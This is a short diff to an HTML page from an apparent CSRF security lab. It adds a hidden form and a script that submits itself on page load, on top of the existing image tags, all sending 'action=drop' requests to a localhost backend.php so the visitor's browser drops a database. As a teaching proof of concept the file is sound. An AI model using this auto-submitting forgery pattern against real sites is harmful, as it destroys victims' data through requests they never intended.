@@ -12,6 +12,12 @@
     <h4>Check your database</h4>
     <img src="http://localhost:8080/seclab/crsf/backend.php?action=drop" />
     <img src="http://localhost/seclab/crsf/backend.php?action=drop" />
+    <form action="http://localhost:8080/seclab/crsf/backend.php" method="get">
+      <input type="hidden" name="action" value="drop" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
   </div>
 </body>
 </html>
